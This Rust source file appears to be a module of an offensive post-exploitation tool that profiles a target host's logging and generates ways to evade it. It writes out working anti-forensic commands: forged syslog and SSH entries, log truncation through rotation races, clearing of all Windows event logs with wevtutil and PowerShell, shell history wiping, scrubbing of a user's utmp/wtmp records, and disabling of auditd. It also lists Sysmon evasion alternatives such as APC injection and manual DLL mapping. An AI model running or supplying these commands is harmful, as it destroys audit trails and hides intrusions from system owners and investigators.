use std::collections::HashMap;

use serde::{Deserialize, Serialize};

/// Logging system types detectable on target hosts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum LoggingSystem {
    Syslog,
    Journald,
    Auditd,
    Rsyslog,
    SyslogNg,
    WindowsEventLog,
    Sysmon,
    Nxlog,
    Fluentd,
    Logrotate,
}

impl std::fmt::Display for LoggingSystem {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Syslog => write!(f, "syslog"),
            Self::Journald => write!(f, "journald"),
            Self::Auditd => write!(f, "auditd"),
            Self::Rsyslog => write!(f, "rsyslog"),
            Self::SyslogNg => write!(f, "syslog-ng"),
            Self::WindowsEventLog => write!(f, "windows-event-log"),
            Self::Sysmon => write!(f, "sysmon"),
            Self::Nxlog => write!(f, "nxlog"),
            Self::Fluentd => write!(f, "fluentd"),
            Self::Logrotate => write!(f, "logrotate"),
        }
    }
}

/// Linux distribution families for distro-specific log path resolution.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum LinuxDistro {
    Debian,
    Ubuntu,
    RedHat,
    CentOS,
    Fedora,
    Arch,
    Alpine,
    Suse,
    Gentoo,
    Unknown,
}

impl std::fmt::Display for LinuxDistro {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Debian => write!(f, "debian"),
            Self::Ubuntu => write!(f, "ubuntu"),
            Self::RedHat => write!(f, "redhat"),
            Self::CentOS => write!(f, "centos"),
            Self::Fedora => write!(f, "fedora"),
            Self::Arch => write!(f, "arch"),
            Self::Alpine => write!(f, "alpine"),
            Self::Suse => write!(f, "suse"),
            Self::Gentoo => write!(f, "gentoo"),
            Self::Unknown => write!(f, "unknown"),
        }
    }
}

/// Categories of log evasion techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum LogEvasionMethod {
    LogInjection,
    RotationExploit,
    UtmpManipulation,
    WtmpManipulation,
    HistoryManipulation,
    EventLogClearing,
    SysmonEvasion,
    AuditdEvasion,
    TimestampManipulation,
    LogTruncation,
}

impl std::fmt::Display for LogEvasionMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::LogInjection => write!(f, "log-injection"),
            Self::RotationExploit => write!(f, "rotation-exploit"),
            Self::UtmpManipulation => write!(f, "utmp-manipulation"),
            Self::WtmpManipulation => write!(f, "wtmp-manipulation"),
            Self::HistoryManipulation => write!(f, "history-manipulation"),
            Self::EventLogClearing => write!(f, "event-log-clearing"),
            Self::SysmonEvasion => write!(f, "sysmon-evasion"),
            Self::AuditdEvasion => write!(f, "auditd-evasion"),
            Self::TimestampManipulation => write!(f, "timestamp-manipulation"),
            Self::LogTruncation => write!(f, "log-truncation"),
        }
    }
}

/// Sysmon event IDs that are commonly monitored and should be evaded.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SysmonEventId {
    ProcessCreate = 1,
    FileCreateTime = 2,
    NetworkConnect = 3,
    ServiceStateChange = 4,
    ProcessTerminate = 5,
    DriverLoad = 6,
    ImageLoad = 7,
    CreateRemoteThread = 8,
    RawAccessRead = 9,
    ProcessAccess = 10,
    FileCreate = 11,
    RegistryEvent = 13,
    PipeCreated = 17,
    DnsQuery = 22,
}

impl std::fmt::Display for SysmonEventId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ProcessCreate => write!(f, "1:ProcessCreate"),
            Self::FileCreateTime => write!(f, "2:FileCreateTime"),
            Self::NetworkConnect => write!(f, "3:NetworkConnect"),
            Self::ServiceStateChange => write!(f, "4:ServiceStateChange"),
            Self::ProcessTerminate => write!(f, "5:ProcessTerminate"),
            Self::DriverLoad => write!(f, "6:DriverLoad"),
            Self::ImageLoad => write!(f, "7:ImageLoad"),
            Self::CreateRemoteThread => write!(f, "8:CreateRemoteThread"),
            Self::RawAccessRead => write!(f, "9:RawAccessRead"),
            Self::ProcessAccess => write!(f, "10:ProcessAccess"),
            Self::FileCreate => write!(f, "11:FileCreate"),
            Self::RegistryEvent => write!(f, "13:RegistryEvent"),
            Self::PipeCreated => write!(f, "17:PipeCreated"),
            Self::DnsQuery => write!(f, "22:DnsQuery"),
        }
    }
}

/// Detected logging configuration on a target system.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoggingConfig {
    pub active_systems: Vec<LoggingSystem>,
    pub log_file_paths: Vec<LogFilePath>,
    pub remote_logging_enabled: bool,
    pub remote_logging_destinations: Vec<String>,
    pub sysmon_config: Option<SysmonConfig>,
    pub auditd_rules: Vec<String>,
    pub distro: LinuxDistro,
}

/// A discovered log file with metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogFilePath {
    pub path: String,
    pub logging_system: LoggingSystem,
    pub writable: bool,
    pub size_bytes: u64,
    pub rotation_config: Option<RotationConfig>,
}

/// Log rotation configuration for a log file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RotationConfig {
    pub max_size_bytes: u64,
    pub max_files: u32,
    pub compress_on_rotate: bool,
    pub rotation_schedule: String,
}

/// Sysmon configuration details.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SysmonConfig {
    pub version: String,
    pub monitored_events: Vec<SysmonEventId>,
    pub excluded_processes: Vec<String>,
    pub excluded_ips: Vec<String>,
    pub hash_algorithms: Vec<String>,
}

/// A generated log injection payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogInjectionPayload {
    pub technique: LogEvasionMethod,
    pub target_system: LoggingSystem,
    pub payload: String,
    pub description: String,
    pub detection_risk: f64,
}

/// Result of analyzing utmp/wtmp records.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoginRecord {
    pub record_type: LoginRecordType,
    pub username: String,
    pub terminal: String,
    pub host: String,
    pub timestamp_epoch: u64,
}

/// Types of login records found in utmp/wtmp.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum LoginRecordType {
    UserLogin,
    UserLogout,
    BootTime,
    RunLevel,
    DeadProcess,
}

impl std::fmt::Display for LoginRecordType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UserLogin => write!(f, "user-login"),
            Self::UserLogout => write!(f, "user-logout"),
            Self::BootTime => write!(f, "boot-time"),
            Self::RunLevel => write!(f, "run-level"),
            Self::DeadProcess => write!(f, "dead-process"),
        }
    }
}

/// Sysmon evasion strategy recommendation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SysmonEvasionStrategy {
    pub event_id: SysmonEventId,
    pub evasion_method: String,
    pub alternative_api: Option<String>,
    pub detection_risk: f64,
}

/// Windows Event Log clearing command set.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventLogClearCommand {
    pub channel: String,
    pub command: String,
    pub requires_admin: bool,
    pub detection_risk: f64,
}

/// Aggregated log evasion analysis report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogEvasionReport {
    pub detected_config: LoggingConfig,
    pub injection_payloads: Vec<LogInjectionPayload>,
    pub login_records: Vec<LoginRecord>,
    pub sysmon_evasions: Vec<SysmonEvasionStrategy>,
    pub event_log_commands: Vec<EventLogClearCommand>,
    pub history_commands: Vec<String>,
    pub rotation_exploits: Vec<LogInjectionPayload>,
    pub technique_coverage: HashMap<LogEvasionMethod, usize>,
}

/// Simulated target logging environment for analysis.
#[derive(Debug, Clone, Default)]
pub struct LogEnvironment {
    pub detected_systems: Vec<LoggingSystem>,
    pub log_files: Vec<LogFilePath>,
    pub distro: Option<LinuxDistro>,
    pub remote_logging: bool,
    pub remote_destinations: Vec<String>,
    pub sysmon_config: Option<SysmonConfig>,
    pub auditd_rules: Vec<String>,
    pub utmp_records: Vec<LoginRecord>,
    pub wtmp_records: Vec<LoginRecord>,
    pub target_username: Option<String>,
    pub is_windows: bool,
}

/// Configuration for the log evasion engine.
#[derive(Debug, Clone)]
pub struct LogEvasionConfig {
    pub generate_injection_payloads: bool,
    pub generate_rotation_exploits: bool,
    pub generate_sysmon_evasions: bool,
    pub generate_event_log_commands: bool,
    pub generate_history_commands: bool,
    pub max_detection_risk: f64,
    pub target_username: Option<String>,
}

impl Default for LogEvasionConfig {
    fn default() -> Self {
        Self {
            generate_injection_payloads: true,
            generate_rotation_exploits: true,
            generate_sysmon_evasions: true,
            generate_event_log_commands: true,
            generate_history_commands: true,
            max_detection_risk: 1.0,
            target_username: None,
        }
    }
}

/// Log paths per distro family.
const DEBIAN_LOG_PATHS: &[(&str, LoggingSystem)] = &[
    ("/var/log/syslog", LoggingSystem::Syslog),
    ("/var/log/auth.log", LoggingSystem::Syslog),
    ("/var/log/kern.log", LoggingSystem::Syslog),
    ("/var/log/dpkg.log", LoggingSystem::Syslog),
    ("/var/log/apt/history.log", LoggingSystem::Syslog),
    ("/var/log/daemon.log", LoggingSystem::Syslog),
];

const REDHAT_LOG_PATHS: &[(&str, LoggingSystem)] = &[
    ("/var/log/messages", LoggingSystem::Syslog),
    ("/var/log/secure", LoggingSystem::Syslog),
    ("/var/log/maillog", LoggingSystem::Syslog),
    ("/var/log/cron", LoggingSystem::Syslog),
    ("/var/log/boot.log", LoggingSystem::Syslog),
    ("/var/log/yum.log", LoggingSystem::Syslog),
];

const COMMON_LOG_PATHS: &[(&str, LoggingSystem)] = &[
    ("/var/log/wtmp", LoggingSystem::Syslog),
    ("/var/log/btmp", LoggingSystem::Syslog),
    ("/var/run/utmp", LoggingSystem::Syslog),
    ("/var/log/lastlog", LoggingSystem::Syslog),
    ("/var/log/faillog", LoggingSystem::Syslog),
    ("/var/log/audit/audit.log", LoggingSystem::Auditd),
];

/// Windows event log channels commonly targeted for clearing.
const WINDOWS_EVENT_CHANNELS: &[&str] = &[
    "Security",
    "System",
    "Application",
    "Microsoft-Windows-Sysmon/Operational",
    "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-WMI-Activity/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
    "Microsoft-Windows-Bits-Client/Operational",
];

/// Sysmon-monitored API calls that should be avoided.
const SYSMON_MONITORED_APIS: &[(&str, SysmonEventId, &str)] = &[
    (
        "CreateProcess/CreateProcessW",
        SysmonEventId::ProcessCreate,
        "Use NtCreateUserProcess or spawn via WMI/COM",
    ),
    (
        "CreateRemoteThread",
        SysmonEventId::CreateRemoteThread,
        "Use NtCreateThreadEx with THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER or APC injection",
    ),
    (
        "OpenProcess",
        SysmonEventId::ProcessAccess,
        "Use NtOpenProcess with minimum access rights or duplicate handle from csrss.exe",
    ),
    (
        "SetFileTime",
        SysmonEventId::FileCreateTime,
        "Use NtSetInformationFile with FileBasicInformation",
    ),
    (
        "connect/WSAConnect",
        SysmonEventId::NetworkConnect,
        "Use raw sockets or named pipe redirection",
    ),
    (
        "LoadLibrary/LoadLibraryEx",
        SysmonEventId::ImageLoad,
        "Use manual mapping or LdrLoadDll",
    ),
    (
        "RegSetValueEx",
        SysmonEventId::RegistryEvent,
        "Use NtSetValueKey or direct registry hive manipulation",
    ),
    (
        "CreateNamedPipe",
        SysmonEventId::PipeCreated,
        "Use anonymous pipes or shared memory sections",
    ),
    (
        "DnsQuery_A/DnsQuery_W",
        SysmonEventId::DnsQuery,
        "Use DNS-over-HTTPS or manual UDP socket to external resolver",
    ),
];

/// Analyzes target logging systems and generates evasion strategies.
pub struct LogEvasionEngine {
    config: LogEvasionConfig,
}

impl LogEvasionEngine {
    pub fn new(config: LogEvasionConfig) -> Self {
        Self { config }
    }

    pub fn with_defaults() -> Self {
        Self::new(LogEvasionConfig::default())
    }

    /// Analyze the logging environment and produce a full evasion report.
    pub fn analyze(&self, env: &LogEnvironment) -> LogEvasionReport {
        let detected_config = self.build_logging_config(env);
        let mut technique_coverage: HashMap<LogEvasionMethod, usize> = HashMap::new();

        let injection_payloads = if self.config.generate_injection_payloads {
            let payloads = self.generate_injection_payloads(env);
            *technique_coverage
                .entry(LogEvasionMethod::LogInjection)
                .or_insert(0) += payloads.len();
            payloads
        } else {
            Vec::new()
        };

        let rotation_exploits = if self.config.generate_rotation_exploits {
            let exploits = self.generate_rotation_exploits(env);
            *technique_coverage
                .entry(LogEvasionMethod::RotationExploit)
                .or_insert(0) += exploits.len();
            exploits
        } else {
            Vec::new()
        };

        let login_records = self.collect_login_records(env);
        if !login_records.is_empty() {
            *technique_coverage
                .entry(LogEvasionMethod::UtmpManipulation)
                .or_insert(0) += login_records.len();
        }

        let sysmon_evasions = if self.config.generate_sysmon_evasions {
            let evasions = self.generate_sysmon_evasions(env);
            *technique_coverage
                .entry(LogEvasionMethod::SysmonEvasion)
                .or_insert(0) += evasions.len();
            evasions
        } else {
            Vec::new()
        };

        let event_log_commands = if self.config.generate_event_log_commands && env.is_windows {
            let commands = self.generate_event_log_commands();
            *technique_coverage
                .entry(LogEvasionMethod::EventLogClearing)
                .or_insert(0) += commands.len();
            commands
        } else {
            Vec::new()
        };

        let history_commands = if self.config.generate_history_commands {
            let cmds = Self::generate_history_evasion_commands();
            *technique_coverage
                .entry(LogEvasionMethod::HistoryManipulation)
                .or_insert(0) += cmds.len();
            cmds
        } else {
            Vec::new()
        };

        LogEvasionReport {
            detected_config,
            injection_payloads,
            login_records,
            sysmon_evasions,
            event_log_commands,
            history_commands,
            rotation_exploits,
            technique_coverage,
        }
    }

    fn build_logging_config(&self, env: &LogEnvironment) -> LoggingConfig {
        LoggingConfig {
            active_systems: env.detected_systems.clone(),
            log_file_paths: env.log_files.clone(),
            remote_logging_enabled: env.remote_logging,
            remote_logging_destinations: env.remote_destinations.clone(),
            sysmon_config: env.sysmon_config.clone(),
            auditd_rules: env.auditd_rules.clone(),
            distro: env.distro.unwrap_or(LinuxDistro::Unknown),
        }
    }

    /// Generate log injection payloads to confuse timeline analysis.
    fn generate_injection_payloads(&self, env: &LogEnvironment) -> Vec<LogInjectionPayload> {
        let mut payloads = Vec::new();

        for log_file in &env.log_files {
            if !log_file.writable {
                continue;
            }

            payloads.push(LogInjectionPayload {
                technique: LogEvasionMethod::LogInjection,
                target_system: log_file.logging_system,
                payload: format!(
                    "echo 'Dec 25 03:14:15 localhost kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.1 DST=10.0.0.1' >> {}",
                    log_file.path
                ),
                description: format!(
                    "Inject false UFW firewall entry into {} to create noise in timeline",
                    log_file.path
                ),
                detection_risk: 0.3,
            });

            payloads.push(LogInjectionPayload {
                technique: LogEvasionMethod::LogInjection,
                target_system: log_file.logging_system,
                payload: format!(
                    "echo 'Jan  1 00:00:00 localhost CRON[99999]: (root) CMD (/usr/lib/apt/apt.systemd.daily)' >> {}",
                    log_file.path
                ),
                description: format!(
                    "Inject benign cron entry into {} to dilute suspicious entries",
                    log_file.path
                ),
                detection_risk: 0.2,
            });

            payloads.push(LogInjectionPayload {
                technique: LogEvasionMethod::LogInjection,
                target_system: log_file.logging_system,
                payload: format!(
                    "printf '\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' >> {}",
                    log_file.path
                ),
                description: format!(
                    "Inject blank lines into {} to break log parser field extraction",
                    log_file.path
                ),
                detection_risk: 0.5,
            });
        }

        if env.detected_systems.contains(&LoggingSystem::Syslog)
            || env.detected_systems.contains(&LoggingSystem::Rsyslog)
        {
            payloads.push(LogInjectionPayload {
                technique: LogEvasionMethod::LogInjection,
                target_system: LoggingSystem::Syslog,
                payload: "logger -p auth.info 'sshd[31337]: Accepted publickey for admin from 10.0.0.1 port 22 ssh2'".to_string(),
                description: "Use logger(1) to inject false SSH authentication success into auth log".to_string(),
                detection_risk: 0.4,
            });
        }

        payloads
            .into_iter()
            .filter(|p| p.detection_risk <= self.config.max_detection_risk)
            .collect()
    }

    /// Generate log rotation exploitation payloads.
    fn generate_rotation_exploits(&self, env: &LogEnvironment) -> Vec<LogInjectionPayload> {
        let mut exploits = Vec::new();

        for log_file in &env.log_files {
            if let Some(ref rotation) = log_file.rotation_config {
                if rotation.compress_on_rotate {
                    exploits.push(LogInjectionPayload {
                        technique: LogEvasionMethod::RotationExploit,
                        target_system: log_file.logging_system,
                        payload: format!(
                            "# Race condition: write between rotation and compression\n\
                             # Monitor inotify for MOVED_FROM on {path}\n\
                             inotifywait -e moved_from -q {path} && \\\n\
                             truncate -s 0 {path}",
                            path = log_file.path
                        ),
                        description: format!(
                            "Exploit rotation window on {} — truncate after logrotate moves the file but before compression",
                            log_file.path
                        ),
                        detection_risk: 0.6,
                    });
                }

                if rotation.max_size_bytes > 0 {
                    exploits.push(LogInjectionPayload {
                        technique: LogEvasionMethod::RotationExploit,
                        target_system: log_file.logging_system,
                        payload: format!(
                            "# Force rotation by filling log to max_size\n\
                             dd if=/dev/urandom bs=1024 count={count} >> {path} 2>/dev/null",
                            count = rotation.max_size_bytes / 1024,
                            path = log_file.path
                        ),
                        description: format!(
                            "Force rotation of {} by padding to max_size_bytes ({}), pushing evidence into rotated+compressed archive",
                            log_file.path, rotation.max_size_bytes
                        ),
                        detection_risk: 0.7,
                    });
                }
            }
        }

        exploits
            .into_iter()
            .filter(|p| p.detection_risk <= self.config.max_detection_risk)
            .collect()
    }

    /// Collect login records from utmp/wtmp for manipulation analysis.
    fn collect_login_records(&self, env: &LogEnvironment) -> Vec<LoginRecord> {
        let mut records = Vec::new();
        records.extend(env.utmp_records.clone());
        records.extend(env.wtmp_records.clone());
        records
    }

    /// Generate Sysmon evasion strategies based on monitored events.
    fn generate_sysmon_evasions(&self, env: &LogEnvironment) -> Vec<SysmonEvasionStrategy> {
        let mut evasions = Vec::new();

        let monitored_events = if let Some(ref sysmon) = env.sysmon_config {
            &sysmon.monitored_events
        } else {
            return evasions;
        };

        for (api_call, event_id, alternative) in SYSMON_MONITORED_APIS {
            if monitored_events.contains(event_id) {
                evasions.push(SysmonEvasionStrategy {
                    event_id: *event_id,
                    evasion_method: format!(
                        "Avoid {} (triggers Sysmon event {})",
                        api_call, event_id
                    ),
                    alternative_api: Some(alternative.to_string()),
                    detection_risk: 0.3,
                });
            }
        }

        evasions
    }

    /// Generate Windows Event Log clearing commands.
    fn generate_event_log_commands(&self) -> Vec<EventLogClearCommand> {
        let mut commands = Vec::new();

        for channel in WINDOWS_EVENT_CHANNELS {
            commands.push(EventLogClearCommand {
                channel: channel.to_string(),
                command: format!("wevtutil cl \"{}\"", channel),
                requires_admin: true,
                detection_risk: 0.9,
            });
        }

        commands.push(EventLogClearCommand {
            channel: "ALL".to_string(),
            command: "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""
                .to_string(),
            requires_admin: true,
            detection_risk: 1.0,
        });

        commands.push(EventLogClearCommand {
            channel: "Security".to_string(),
            command: "powershell -c \"Clear-EventLog -LogName Security\"".to_string(),
            requires_admin: true,
            detection_risk: 0.85,
        });

        commands.push(EventLogClearCommand {
            channel: "ALL".to_string(),
            command: "powershell -c \"Get-WinEvent -ListLog * | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }\"".to_string(),
            requires_admin: true,
            detection_risk: 0.95,
        });

        commands
    }

    /// Generate bash/shell history evasion commands.
    fn generate_history_evasion_commands() -> Vec<String> {
        vec![
            "unset HISTFILE".to_string(),
            "export HISTSIZE=0".to_string(),
            "export HISTFILESIZE=0".to_string(),
            "set +o history".to_string(),
            "export HISTCONTROL=ignoreboth".to_string(),
            "export HISTIGNORE='*'".to_string(),
            "ln -sf /dev/null ~/.bash_history".to_string(),
            "history -c && history -w".to_string(),
            "cat /dev/null > ~/.bash_history && history -c".to_string(),
            "shred -zu ~/.bash_history && touch ~/.bash_history".to_string(),
            "export PROMPT_COMMAND='history -a; history -c'".to_string(),
            "kill -9 $$".to_string(),
        ]
    }

    /// Generate utmp/wtmp record removal commands for hiding login evidence.
    pub fn utmp_wtmp_manipulation_commands(username: &str) -> Vec<String> {
        vec![
            format!(
                "utmpdump /var/run/utmp | grep -v '{}' | utmpdump -r > /tmp/utmp.clean && mv /tmp/utmp.clean /var/run/utmp",
                username
            ),
            format!(
                "utmpdump /var/log/wtmp | grep -v '{}' | utmpdump -r > /tmp/wtmp.clean && mv /tmp/wtmp.clean /var/log/wtmp",
                username
            ),
            format!(
                "utmpdump /var/log/btmp | grep -v '{}' | utmpdump -r > /tmp/btmp.clean && mv /tmp/btmp.clean /var/log/btmp",
                username
            ),
            format!("last -f /var/log/wtmp | grep -v '{}'", username),
            format!(
                "# Python one-liner to surgically remove specific utmp entries:\n\
                 python3 -c \"import struct; f=open('/var/run/utmp','r+b'); data=f.read(); \\\n\
                 entries=[data[i:i+384] for i in range(0,len(data),384)]; \\\n\
                 clean=[e for e in entries if b'{user}' not in e]; \\\n\
                 f.seek(0); f.truncate(); [f.write(e) for e in clean]; f.close()\"",
                user = username
            ),
        ]
    }

    /// Generate auditd evasion techniques.
    pub fn auditd_evasion_commands() -> Vec<String> {
        vec![
            "auditctl -e 0".to_string(),
            "auditctl -D".to_string(),
            "service auditd stop".to_string(),
            "systemctl stop auditd".to_string(),
            "kill -TERM $(pidof auditd)".to_string(),
            "echo '' > /var/log/audit/audit.log".to_string(),
            "ausearch -m all -ts today | aureport --summary".to_string(),
            "auditctl -a never,exit -F arch=b64 -S all".to_string(),
        ]
    }

    /// Return distro-specific log paths.
    pub fn log_paths_for_distro(distro: LinuxDistro) -> Vec<(&'static str, LoggingSystem)> {
        let mut paths = Vec::new();
        match distro {
            LinuxDistro::Debian | LinuxDistro::Ubuntu => {
                paths.extend_from_slice(DEBIAN_LOG_PATHS);
            }
            LinuxDistro::RedHat | LinuxDistro::CentOS | LinuxDistro::Fedora => {
                paths.extend_from_slice(REDHAT_LOG_PATHS);
            }
            _ => {
                paths.extend_from_slice(DEBIAN_LOG_PATHS);
            }
        }
        paths.extend_from_slice(COMMON_LOG_PATHS);
        paths
    }

    /// Return known Windows event log channels.
    pub fn windows_event_channels() -> &'static [&'static str] {
        WINDOWS_EVENT_CHANNELS
    }

    /// Return Sysmon-monitored API reference table.
    pub fn sysmon_monitored_apis() -> &'static [(&'static str, SysmonEventId, &'static str)] {
        SYSMON_MONITORED_APIS
    }
}
